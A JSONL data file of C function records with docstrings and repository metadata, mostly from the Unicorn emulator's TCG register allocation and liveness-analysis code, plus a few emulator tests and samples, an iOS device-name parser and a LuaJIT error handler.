{"docstring": "// Parse a device name.\n", "func_signal": "static bool\nparse_device_internal(const char *device, char *device_type, unsigned *major, unsigned *minor,\n\t\tbool allow_wildcard, const char **end)", "code": "{\n\t// \"iPhone11,8\" -> \"iPhone\", 11, 8; \"iPad7,*\" -> \"iPad\", 7, ANY\n\t// If this device name doesn't have a comma then we don't know how to parse it. Just set\n\t// the whole thing as the device type.\n\tconst char *comma = strchr(device, ',');\n\tif (comma == NULL) {\nunknown:\n\t\tstrcpy(device_type, device);\n\t\t*major = 0;\n\t\t*minor = 0;\n\t\treturn false;\n\t}\n\t// Walk backwards from the comma to the start of the major version.\n\tif (comma == device) {\n\t\tgoto unknown;\n\t}\n\tconst char *p = comma;\n\tfor (;;) {\n\t\tchar ch = *(p - 1);\n\t\tif (!(('0' <= ch && ch <= '9') || (allow_wildcard && ch == '*'))) {\n\t\t\tbreak;\n\t\t}\n\t\tp--;\n\t\tif (p == device) {\n\t\t\tgoto unknown;\n\t\t}\n\t}\n\tif (p == comma) {\n\t\tgoto unknown;\n\t}\n\tsize_t device_type_length = p - device;\n\t// Parse the version numbers.\n\tbool ok = parse_device_version_internal(p, major, minor, allow_wildcard, end);\n\tif (!ok) {\n\t\tgoto unknown;\n\t}\n\t// Return the device_type string. This is last in case it's shared with the device string.\n\tstrncpy(device_type, device, device_type_length);\n\tdevice_type[device_type_length] = 0;\n\treturn true;\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "/* Allocate a register belonging to reg1 & ~reg2 */\n", "func_signal": "static int tcg_reg_alloc(TCGContext *s, TCGRegSet reg1, TCGRegSet reg2)", "code": "{\n    int i, reg;\n    TCGRegSet reg_ct;\n\n    tcg_regset_andnot(reg_ct, reg1, reg2);\n\n    /* first try free registers */\n    for(i = 0; i < ARRAY_SIZE(tcg_target_reg_alloc_order); i++) {\n        reg = tcg_target_reg_alloc_order[i];\n        if (tcg_regset_test_reg(reg_ct, reg) && s->reg_to_temp[reg] == -1)\n            return reg;\n    }\n\n    /* XXX: do better spill choice */\n    for(i = 0; i < ARRAY_SIZE(tcg_target_reg_alloc_order); i++) {\n        reg = tcg_target_reg_alloc_order[i];\n        if (tcg_regset_test_reg(reg_ct, reg)) {\n            tcg_reg_free(s, reg);\n            return reg;\n        }\n    }\n\n    tcg_abort();\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* save globals to their canonical location and assume they can be\n   modified be the following code. 'allocated_regs' is used in case a\n   temporary registers needs to be allocated to store a constant. */\n", "func_signal": "static void save_globals(TCGContext *s, TCGRegSet allocated_regs)", "code": "{\n    int i;\n\n    for(i = 0; i < s->nb_globals; i++) {\n        temp_save(s, i, allocated_regs);\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* sync register 'reg' by saving it to the corresponding temporary */\n", "func_signal": "static inline void tcg_reg_sync(TCGContext *s, int reg)", "code": "{\n    TCGTemp *ts;\n    int temp;\n\n    temp = s->reg_to_temp[reg];\n    ts = &s->temps[temp];\n    assert(ts->val_type == TEMP_VAL_REG);\n    if (!ts->mem_coherent && !ts->fixed_reg) {\n        if (!ts->mem_allocated) {\n            temp_allocate_frame(s, temp);\n        }\n        tcg_out_st(s, ts->type, reg, ts->mem_reg, ts->mem_offset);\n    }\n    ts->mem_coherent = 1;\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* sync a temporary to memory. 'allocated_regs' is used in case a\n   temporary registers needs to be allocated to store a constant. */\n", "func_signal": "static inline void temp_sync(TCGContext *s, int temp, TCGRegSet allocated_regs)", "code": "{\n    TCGTemp *ts;\n\n    ts = &s->temps[temp];\n    if (!ts->fixed_reg) {\n        switch(ts->val_type) {\n        case TEMP_VAL_CONST:\n            ts->reg = tcg_reg_alloc(s, (TCGRegSet)s->tcg_target_available_regs[ts->type],\n                                    allocated_regs);\n            ts->val_type = TEMP_VAL_REG;\n            s->reg_to_temp[ts->reg] = temp;\n            ts->mem_coherent = 0;\n            tcg_out_movi(s, ts->type, ts->reg, ts->val);\n            /* fallthrough*/\n        case TEMP_VAL_REG:\n            tcg_reg_sync(s, ts->reg);\n            break;\n        case TEMP_VAL_DEAD:\n        case TEMP_VAL_MEM:\n            break;\n        default:\n            tcg_abort();\n        }\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* free register 'reg' by spilling the corresponding temporary if necessary */\n", "func_signal": "static void tcg_reg_free(TCGContext *s, int reg)", "code": "{\n    int temp;\n\n    temp = s->reg_to_temp[reg];\n    if (temp != -1) {\n        tcg_reg_sync(s, reg);\n        s->temps[temp].val_type = TEMP_VAL_MEM;\n        s->reg_to_temp[reg] = -1;\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "// This is a thread that just runs uc_emu_start() in it.\n// The code that it is executing in this case will run forever until it is stopped by uc_emu_stop().\n", "func_signal": "static uc_err emu_starter(void* param)", "code": "{\n    uc_engine *uc;\n    uint64_t start_addr;\n    uint64_t end_addr;\n    uc_err err;\n    \n    EmuStarterParam_t* starter_params = (EmuStarterParam_t *)param;\n    uc = starter_params->uc;\n    start_addr = starter_params->startAddr;\n    end_addr = starter_params->endAddr;\n    \n    printf(\"uc_emu_start()\\n\");\n    err = uc_emu_start(uc, start_addr, end_addr, 0, 0);\n    if (err)\n    {\n        printf(\"Failed on uc_emu_start() with error returned %u: %s\\n\",\n                err, uc_strerror(err));\n    }\n\n    return err;\n}", "path": "unicorn/tests/regress/threaded_emu_start.c", "commit_date": "2017-06-25 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* at the end of a basic block, we assume all temporaries are dead and\n   all globals are stored at their canonical location. */\n", "func_signal": "static void tcg_reg_alloc_bb_end(TCGContext *s, TCGRegSet allocated_regs)", "code": "{\n    TCGTemp *ts;\n    int i;\n\n    for(i = s->nb_globals; i < s->nb_temps; i++) {\n        ts = &s->temps[i];\n        if (ts->temp_local) {\n            temp_save(s, i, allocated_regs);\n        } else {\n#ifdef USE_LIVENESS_ANALYSIS\n            /* The liveness analysis already ensures that temps are dead.\n               Keep an assert for safety. */\n            assert(ts->val_type == TEMP_VAL_DEAD);\n#else\n            temp_dead(s, i);\n#endif\n        }\n    }\n\n    save_globals(s, allocated_regs);\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* dummy liveness analysis */\n", "func_signal": "static void tcg_liveness_analysis(TCGContext *s)", "code": "{\n    int nb_ops;\n    nb_ops = s->gen_opc_ptr - s->gen_opc_buf;\n\n    s->op_dead_args = tcg_malloc(s, nb_ops * sizeof(uint16_t));\n    memset(s->op_dead_args, 0, nb_ops * sizeof(uint16_t));\n    s->op_sync_args = tcg_malloc(s, nb_ops * sizeof(uint8_t));\n    memset(s->op_sync_args, 0, nb_ops * sizeof(uint8_t));\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* Liveness analysis : update the opc_dead_args array to tell if a\n   given input arguments is dead. Instructions updating dead\n   temporaries are removed. */\n", "func_signal": "static void tcg_liveness_analysis(TCGContext *s)", "code": "{\n    int i, op_index, nb_args, nb_iargs, nb_oargs, nb_ops;\n    TCGOpcode op, op_new, op_new2;\n    TCGArg *args, arg;\n    const TCGOpDef *def;\n    uint8_t *dead_temps, *mem_temps;\n    uint16_t dead_args;\n    uint8_t sync_args;\n    bool have_op_new2;\n\n    s->gen_opc_ptr++; /* skip end */\n\n    nb_ops = s->gen_opc_ptr - s->gen_opc_buf;\n\n    s->op_dead_args = tcg_malloc(s, nb_ops * sizeof(uint16_t));\n    s->op_sync_args = tcg_malloc(s, nb_ops * sizeof(uint8_t));\n\n    dead_temps = tcg_malloc(s, s->nb_temps);\n    mem_temps = tcg_malloc(s, s->nb_temps);\n    tcg_la_func_end(s, dead_temps, mem_temps);\n\n    args = s->gen_opparam_ptr;\n    op_index = nb_ops - 1;\n    while (op_index >= 0) {\n        op = s->gen_opc_buf[op_index];\n        def = &s->tcg_op_defs[op];\n        switch(op) {\n        case INDEX_op_call:\n            {\n                int call_flags;\n\n                nb_args = args[-1];\n                args -= nb_args;\n                arg = *args++;\n                nb_iargs = arg & 0xffff;\n                nb_oargs = arg >> 16;\n                call_flags = args[nb_oargs + nb_iargs + 1];\n\n                /* pure functions can be removed if their result is not\n                   used */\n                if (call_flags & TCG_CALL_NO_SIDE_EFFECTS) {\n                    for (i = 0; i < nb_oargs; i++) {\n                        arg = args[i];\n                        if (!dead_temps[arg] || mem_temps[arg]) {\n                            goto do_not_remove_call;\n                        }\n                    }\n                    tcg_set_nop(s, s->gen_opc_buf + op_index,\n                                args - 1, nb_args);\n                } else {\n                do_not_remove_call:\n\n                    /* output args are dead */\n                    dead_args = 0;\n                    sync_args = 0;\n                    for (i = 0; i < nb_oargs; i++) {\n                        arg = args[i];\n                        if (dead_temps[arg]) {\n                            dead_args |= (1 << i);\n                        }\n                        if (mem_temps[arg]) {\n                            sync_args |= (1 << i);\n                        }\n                        dead_temps[arg] = 1;\n                        mem_temps[arg] = 0;\n                    }\n\n                    if (!(call_flags & TCG_CALL_NO_READ_GLOBALS)) {\n                        /* globals should be synced to memory */\n                        memset(mem_temps, 1, s->nb_globals);\n                    }\n                    if (!(call_flags & (TCG_CALL_NO_WRITE_GLOBALS |\n                                        TCG_CALL_NO_READ_GLOBALS))) {\n                        /* globals should go back to memory */\n                        memset(dead_temps, 1, s->nb_globals);\n                    }\n\n                    /* input args are live */\n                    for (i = nb_oargs; i < nb_iargs + nb_oargs; i++) {\n                        arg = args[i];\n                        if (arg != TCG_CALL_DUMMY_ARG) {\n                            if (dead_temps[arg]) {\n                                dead_args |= (1 << i);\n                            }\n                            dead_temps[arg] = 0;\n                        }\n                    }\n                    s->op_dead_args[op_index] = dead_args;\n                    s->op_sync_args[op_index] = sync_args;\n                }\n                args--;\n            }\n            break;\n        case INDEX_op_debug_insn_start:\n            args -= def->nb_args;\n            break;\n        case INDEX_op_nopn:\n            nb_args = args[-1];\n            args -= nb_args;\n            break;\n        case INDEX_op_discard:\n            args--;\n            /* mark the temporary as dead */\n            dead_temps[args[0]] = 1;\n            mem_temps[args[0]] = 0;\n            break;\n        case INDEX_op_end:\n            break;\n\n        case INDEX_op_add2_i32:\n            op_new = INDEX_op_add_i32;\n            goto do_addsub2;\n        case INDEX_op_sub2_i32:\n            op_new = INDEX_op_sub_i32;\n            goto do_addsub2;\n        case INDEX_op_add2_i64:\n            op_new = INDEX_op_add_i64;\n            goto do_addsub2;\n        case INDEX_op_sub2_i64:\n            op_new = INDEX_op_sub_i64;\n        do_addsub2:\n            args -= 6;\n            nb_iargs = 4;\n            nb_oargs = 2;\n            /* Test if the high part of the operation is dead, but not\n               the low part.  The result can be optimized to a simple\n               add or sub.  This happens often for x86_64 guest when the\n               cpu mode is set to 32 bit.  */\n            if (dead_temps[args[1]] && !mem_temps[args[1]]) {\n                if (dead_temps[args[0]] && !mem_temps[args[0]]) {\n                    goto do_remove;\n                }\n                /* Create the single operation plus nop.  */\n                s->gen_opc_buf[op_index] = op = op_new;\n                args[1] = args[2];\n                args[2] = args[4];\n                assert(s->gen_opc_buf[op_index + 1] == INDEX_op_nop);\n                tcg_set_nop(s, s->gen_opc_buf + op_index + 1, args + 3, 3);\n                /* Fall through and mark the single-word operation live.  */\n                nb_iargs = 2;\n                nb_oargs = 1;\n            }\n            goto do_not_remove;\n\n        case INDEX_op_mulu2_i32:\n            op_new = INDEX_op_mul_i32;\n            op_new2 = INDEX_op_muluh_i32;\n            have_op_new2 = TCG_TARGET_HAS_muluh_i32;\n            goto do_mul2;\n        case INDEX_op_muls2_i32:\n            op_new = INDEX_op_mul_i32;\n            op_new2 = INDEX_op_mulsh_i32;\n            have_op_new2 = TCG_TARGET_HAS_mulsh_i32;\n            goto do_mul2;\n        case INDEX_op_mulu2_i64:\n            op_new = INDEX_op_mul_i64;\n            op_new2 = INDEX_op_muluh_i64;\n            have_op_new2 = TCG_TARGET_HAS_muluh_i64;\n            goto do_mul2;\n        case INDEX_op_muls2_i64:\n            op_new = INDEX_op_mul_i64;\n            op_new2 = INDEX_op_mulsh_i64;\n            have_op_new2 = TCG_TARGET_HAS_mulsh_i64;\n            goto do_mul2;\n        do_mul2:\n            args -= 4;\n            nb_iargs = 2;\n            nb_oargs = 2;\n            if (dead_temps[args[1]] && !mem_temps[args[1]]) {\n                if (dead_temps[args[0]] && !mem_temps[args[0]]) {\n                    /* Both parts of the operation are dead.  */\n                    goto do_remove;\n                }\n                /* The high part of the operation is dead; generate the low. */\n                s->gen_opc_buf[op_index] = op = op_new;\n                args[1] = args[2];\n                args[2] = args[3];\n            } else if (have_op_new2 && dead_temps[args[0]]\n                       && !mem_temps[args[0]]) {\n                /* The low part of the operation is dead; generate the high.  */\n                s->gen_opc_buf[op_index] = op = op_new2;\n                args[0] = args[1];\n                args[1] = args[2];\n                args[2] = args[3];\n            } else {\n                goto do_not_remove;\n            }\n            assert(s->gen_opc_buf[op_index + 1] == INDEX_op_nop);\n            tcg_set_nop(s, s->gen_opc_buf + op_index + 1, args + 3, 1);\n            /* Mark the single-word operation live.  */\n            nb_oargs = 1;\n            goto do_not_remove;\n\n        default:\n            /* XXX: optimize by hardcoding common cases (e.g. triadic ops) */\n            args -= def->nb_args;\n            nb_iargs = def->nb_iargs;\n            nb_oargs = def->nb_oargs;\n\n            /* Test if the operation can be removed because all\n               its outputs are dead. We assume that nb_oargs == 0\n               implies side effects */\n            if (!(def->flags & TCG_OPF_SIDE_EFFECTS) && nb_oargs != 0) {\n                for(i = 0; i < nb_oargs; i++) {\n                    if (args[i] >= TCG_MAX_TEMPS) {\n                        continue;\n                    }\n                    arg = args[i];\n                    if (!dead_temps[arg] || mem_temps[arg]) {\n                        goto do_not_remove;\n                    }\n                }\n            do_remove:\n                tcg_set_nop(s, s->gen_opc_buf + op_index, args, def->nb_args);\n#ifdef CONFIG_PROFILER\n                s->del_op_count++;\n#endif\n            } else {\n            do_not_remove:\n\n                /* output args are dead */\n                dead_args = 0;\n                sync_args = 0;\n                for(i = 0; i < nb_oargs; i++) {\n                    arg = args[i];\n                    if (dead_temps[arg]) {\n                        dead_args |= (1 << i);\n                    }\n                    if (mem_temps[arg]) {\n                        sync_args |= (1 << i);\n                    }\n                    dead_temps[arg] = 1;\n                    mem_temps[arg] = 0;\n                }\n\n                /* if end of basic block, update */\n                if (def->flags & TCG_OPF_BB_END) {\n                    // Unicorn: do not optimize dead temps on brcond,\n                    // this causes problem because check_exit_request() inserts\n                    // brcond instruction in the middle of the TB,\n                    // which incorrectly flags end-of-block\n                    if (op != INDEX_op_brcond_i32)\n                        tcg_la_bb_end(s, dead_temps, mem_temps);\n                    // Unicorn: we do not touch dead temps for brcond,\n                    // but we should refresh TCG globals In-Memory states,\n                    // otherwise, important CPU states(especially conditional flags) might be forgotten,\n                    // result in wrongly generated host code that run into wrong branch.\n                    // Refer to https://github.com/unicorn-engine/unicorn/issues/287 for further information\n                    else\n                        tcg_la_br_end(s, mem_temps);\n                } else if (def->flags & TCG_OPF_SIDE_EFFECTS) {\n                    /* globals should be synced to memory */\n                    memset(mem_temps, 1, s->nb_globals);\n                }\n\n                /* input args are live */\n                for(i = nb_oargs; i < nb_oargs + nb_iargs; i++) {\n                    arg = args[i];\n                    if (dead_temps[arg]) {\n                        dead_args |= (1 << i);\n                    }\n                    dead_temps[arg] = 0;\n                }\n                s->op_dead_args[op_index] = dead_args;\n                s->op_sync_args[op_index] = sync_args;\n            }\n            break;\n        }\n        op_index--;\n    }\n\n    if (args != s->gen_opparam_buf) {\n        tcg_abort();\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "// This hook is used to show that code is executing in the emulator.\n", "func_signal": "static void mips_codehook(uc_engine *uc, uint64_t address, uint32_t size, void *user_data)", "code": "{\n    printf(\"Executing: %\"PRIx64\"\\n\", address);\n    if( address == 0x100008 )\n    {\n        printf(\"Stopping at: %\"PRIx64\"\\n\", address);\n        uc_emu_stop(uc);\n    }\n}", "path": "unicorn/tests/regress/emu_stop_in_hook_overrun.c", "commit_date": "2017-01-22 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* set a nop for an operation using 'nb_args' */\n", "func_signal": "static inline void tcg_set_nop(TCGContext *s, uint16_t *opc_ptr,\n                               TCGArg *args, int nb_args)", "code": "{\n    if (nb_args == 0) {\n        *opc_ptr = INDEX_op_nop;\n    } else {\n        *opc_ptr = INDEX_op_nopn;\n        args[0] = nb_args;\n        args[nb_args - 1] = nb_args;\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* label relocation processing */\n", "func_signal": "static void tcg_out_reloc(TCGContext *s, tcg_insn_unit *code_ptr, int type,\n                          int label_index, intptr_t addend)", "code": "{\n    TCGLabel *l;\n    TCGRelocation *r;\n\n    l = &s->labels[label_index];\n    if (l->has_value) {\n        /* FIXME: This may break relocations on RISC targets that\n           modify instruction fields in place.  The caller may not have\n           written the initial value.  */\n        patch_reloc(code_ptr, type, l->u.value, addend);\n    } else {\n        /* add a new relocation entry */\n        r = tcg_malloc(s, sizeof(TCGRelocation));\n        r->type = type;\n        r->ptr = code_ptr;\n        r->addend = addend;\n        r->next = l->u.first_reloc;\n        l->u.first_reloc = r;\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "// Unicorn engine\n// check if the last memory access was invalid\n// if so, we jump to the block epilogue to quit immediately.\n", "func_signal": "void check_exit_request(TCGContext *tcg_ctx)", "code": "{\n    TCGv_i32 flag;\n\n    flag = tcg_temp_new_i32(tcg_ctx);\n    tcg_gen_ld_i32(tcg_ctx, flag, tcg_ctx->cpu_env,\n            offsetof(CPUState, tcg_exit_req) - ENV_OFFSET);\n    tcg_gen_brcondi_i32(tcg_ctx, TCG_COND_NE, flag, 0, tcg_ctx->exitreq_label);\n    tcg_temp_free_i32(tcg_ctx, flag);\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* Find helper name.  */\n", "func_signal": "static inline const char *tcg_find_helper(TCGContext *s, uintptr_t val)", "code": "{\n    const char *ret = NULL;\n    if (s->helpers) {\n        TCGHelperInfo *info = g_hash_table_lookup(s->helpers, (gpointer)val);\n        if (info) {\n            ret = info->name;\n        }\n    }\n    return ret;\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/*\nstatic void hex_dump(unsigned char *ptr, unsigned int len)\n{\n   int i;\n   for (i = 0; i < len; i++) {\n      if (i != 0 && (i & 0xf) == 0) {\n         fprintf(stderr, \"\\n\");\n      }\n      fprintf(stderr, \"%02hhx\", ptr[i]);      \n   }\n   fprintf(stderr, \"\\n\");\n}\n*/\n", "func_signal": "static void gdt_demo()", "code": "{\n    uc_engine *uc;\n    uc_hook hook1, hook2;\n    uc_err err;\n    uint8_t buf[128];\n    uc_x86_mmr gdtr;\n    int i;\n    \n    /*\n       bits 32\n\n       push dword 0x01234567\n       push dword 0x89abcdef\n\n       mov dword [fs:0], 0x01234567\n       mov dword [fs:4], 0x89abcdef\n     */\n\n    const uint8_t code[] = \"\\x68\\x67\\x45\\x23\\x01\\x68\\xef\\xcd\\xab\\x89\\x64\\xc7\\x05\\x00\\x00\\x00\\x00\\x67\\x45\\x23\\x01\\x64\\xc7\\x05\\x04\\x00\\x00\\x00\\xef\\xcd\\xab\\x89\";\n    const uint64_t code_address = 0x1000000;\n    const uint64_t stack_address = 0x120000;\n    const uint64_t gdt_address = 0xc0000000;\n    const uint64_t fs_address = 0x7efdd000;\n\n    struct SegmentDescriptor *gdt = (struct SegmentDescriptor*)calloc(31, sizeof(struct SegmentDescriptor));\n\n    int r_esp = (int)stack_address + 0x1000;     // initial esp\n    int r_cs = 0x73;\n    int r_ss = 0x88;      //ring 0\n    int r_ds = 0x7b;\n    int r_es = 0x7b;\n    int r_fs = 0x83;\n\n    gdtr.base = gdt_address;  \n    gdtr.limit = 31 * sizeof(struct SegmentDescriptor) - 1;\n\n    init_descriptor(&gdt[14], 0, 0xfffff000, 1);  //code segment\n    init_descriptor(&gdt[15], 0, 0xfffff000, 0);  //data segment\n    init_descriptor(&gdt[16], 0x7efdd000, 0xfff, 0);  //one page data segment simulate fs\n    init_descriptor(&gdt[17], 0, 0xfffff000, 0);  //ring 0 data\n    gdt[17].dpl = 0;  //set descriptor privilege level\n\n    /*\n       fprintf(stderr, \"GDT: \\n\");\n       hex_dump((unsigned char*)gdt, 31 * sizeof(struct SegmentDescriptor));\n     */\n\n    // Initialize emulator in X86-32bit mode\n    err = uc_open(UC_ARCH_X86, UC_MODE_32, &uc);\n    uc_assert_success(err);\n\n    uc_hook_add(uc, &hook1, UC_HOOK_CODE, hook_code, NULL, code_address, code_address + sizeof(code) - 1);\n\n    err = uc_hook_add(uc, &hook2, UC_HOOK_MEM_WRITE, hook_mem, NULL, (uint64_t)1, (uint64_t)0);\n    uc_assert_success(err);\n\n    // map 1 page of code for this emulation\n    err = uc_mem_map(uc, code_address, 0x1000, UC_PROT_ALL);\n    uc_assert_success(err);\n\n    // map 1 page of stack for this emulation\n    err = uc_mem_map(uc, stack_address, 0x1000, UC_PROT_READ | UC_PROT_WRITE);\n    uc_assert_success(err);\n\n    // map 64k for a GDT\n    err = uc_mem_map(uc, gdt_address, 0x10000, UC_PROT_WRITE | UC_PROT_READ);\n    uc_assert_success(err);\n\n    //set up a GDT BEFORE you manipulate any segment registers\n    err = uc_reg_write(uc, UC_X86_REG_GDTR, &gdtr);\n    uc_assert_success(err);\n\n    // write gdt to be emulated to memory\n    err = uc_mem_write(uc, gdt_address, gdt, 31 * sizeof(struct SegmentDescriptor));\n    uc_assert_success(err);\n\n    // map 1 page for FS\n    err = uc_mem_map(uc, fs_address, 0x1000, UC_PROT_WRITE | UC_PROT_READ);\n    uc_assert_success(err);\n\n    // write machine code to be emulated to memory\n    err = uc_mem_write(uc, code_address, code, sizeof(code)-1);\n    uc_assert_success(err);\n\n    // initialize machine registers\n    err = uc_reg_write(uc, UC_X86_REG_ESP, &r_esp);\n    uc_assert_success(err);\n\n    // when setting SS, need rpl == cpl && dpl == cpl\n    // emulator starts with cpl == 0, so we need a dpl 0 descriptor and rpl 0 selector\n    err = uc_reg_write(uc, UC_X86_REG_SS, &r_ss);\n    uc_assert_success(err);\n\n    err = uc_reg_write(uc, UC_X86_REG_CS, &r_cs);\n    uc_assert_success(err);\n    err = uc_reg_write(uc, UC_X86_REG_DS, &r_ds);\n    uc_assert_success(err);\n    err = uc_reg_write(uc, UC_X86_REG_ES, &r_es);\n    uc_assert_success(err);\n    err = uc_reg_write(uc, UC_X86_REG_FS, &r_fs);\n    uc_assert_success(err);\n\n    // emulate machine code in infinite time\n    err = uc_emu_start(uc, code_address, code_address+sizeof(code)-1, 0, 0);\n    uc_assert_success(err);\n\n    // read from memory\n    err = uc_mem_read(uc, r_esp - 8, buf, 8);\n    uc_assert_success(err);\n\n    for (i = 0; i < 8; i++) {\n        fprintf(stderr, \"%02x\", buf[i]);\n    }\n    fprintf(stderr, \"\\n\");\n\n    assert(memcmp(buf, \"\\xef\\xcd\\xab\\x89\\x67\\x45\\x23\\x01\", 8) == 0);\n\n    // read from memory\n    err = uc_mem_read(uc, fs_address, buf, 8);\n    uc_assert_success(err);\n\n    assert(memcmp(buf, \"\\x67\\x45\\x23\\x01\\xef\\xcd\\xab\\x89\", 8) == 0);\n\n    uc_close(uc);\n    free(gdt);\n}", "path": "unicorn/samples/sample_x86_32_gdt_and_seg_regs.c", "commit_date": "2020-05-02 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* sync globals to their canonical location and assume they can be\n   read by the following code. 'allocated_regs' is used in case a\n   temporary registers needs to be allocated to store a constant. */\n", "func_signal": "static void sync_globals(TCGContext *s, TCGRegSet allocated_regs)", "code": "{\n    int i;\n\n    for (i = 0; i < s->nb_globals; i++) {\n#ifdef USE_LIVENESS_ANALYSIS\n        assert(s->temps[i].val_type != TEMP_VAL_REG || s->temps[i].fixed_reg ||\n               s->temps[i].mem_coherent);\n#else\n        temp_sync(s, i, allocated_regs);\n#endif\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* we give more priority to constraints with less registers */\n", "func_signal": "static int get_constraint_priority(const TCGOpDef *def, int k)", "code": "{\n    const TCGArgConstraint *arg_ct;\n\n    int i, n;\n    arg_ct = &def->args_ct[k];\n    if (arg_ct->ct & TCG_CT_ALIAS) {\n        /* an alias is equivalent to a single register */\n        n = 1;\n    } else {\n        if (!(arg_ct->ct & TCG_CT_REG))\n            return 0;\n        n = 0;\n        for(i = 0; i < TCG_TARGET_NB_REGS; i++) {\n            if (tcg_regset_test_reg(arg_ct->u.regs, i))\n                n++;\n        }\n    }\n    return TCG_TARGET_NB_REGS - n + 1;\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* liveness analysis: end of function: all temps are dead, and globals\n   should be in memory. */\n", "func_signal": "static inline void tcg_la_func_end(TCGContext *s, uint8_t *dead_temps,\n                                   uint8_t *mem_temps)", "code": "{\n    memset(dead_temps, 1, s->nb_temps);\n    memset(mem_temps, 1, s->nb_globals);\n    memset(mem_temps + s->nb_globals, 0, s->nb_temps - s->nb_globals);\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* liveness analysis: end of basic block: all temps are dead, globals\n   and local temps should be in memory. */\n", "func_signal": "static inline void tcg_la_bb_end(TCGContext *s, uint8_t *dead_temps,\n                                 uint8_t *mem_temps)", "code": "{\n    int i;\n\n    memset(dead_temps, 1, s->nb_temps);\n    memset(mem_temps, 1, s->nb_globals);\n    for(i = s->nb_globals; i < s->nb_temps; i++) {\n        mem_temps[i] = s->temps[i].temp_local;\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/*\n    Unicorn: for brcond, we should refresh liveness states for TCG globals\n*/\n", "func_signal": "static inline void tcg_la_br_end(TCGContext *s, uint8_t *mem_temps)", "code": "{\n    int i;\n    memset(mem_temps, 1, s->nb_globals);\n    for(i = s->nb_globals; i < s->nb_temps; i++) {\n        mem_temps[i] = s->temps[i].temp_local;\n    }\n}", "path": "unicorn/qemu/tcg/tcg.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "unicorn-engine/unicorn", "stars": 7031, "license": "gpl-2.0", "language": "c", "size": 15648}
{"docstring": "/* Error handler, called from assembler VM. */\n", "func_signal": "void LJ_FASTCALL lj_ffh_coroutine_wrap_err(lua_State *L, lua_State *co)", "code": "{\n  co->top--; copyTV(L, L->top, co->top); L->top++;\n  if (tvisstr(L->top-1))\n    lj_err_callermsg(L, strVdata(L->top-1));\n  else\n    lj_err_run(L);\n}", "path": "LuaJIT/src/lib_base.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
